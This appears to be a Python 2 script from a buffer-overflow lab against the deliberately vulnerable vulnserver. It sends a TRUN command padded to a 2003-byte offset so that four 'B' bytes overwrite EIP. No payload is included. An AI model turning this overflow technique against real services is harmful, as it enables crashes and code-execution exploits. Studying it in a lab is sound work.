#!/usr/bin/env python2

import sys, socket

shellcode = ('A' * 2003)  # 2003 because pattern_offset.rb with 3200 length found 386F4337 as a val at position 2003
shellcode += ('B' * 4)  # this should fill the EIP register in vulnserver with 'B' character

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.33.16', 9999))
cmd = ('TRUN /.:/' + shellcode)

# print("SEND "+cmd)
s.send(cmd)
print("sent %d bytes" % len(cmd))
s.close()
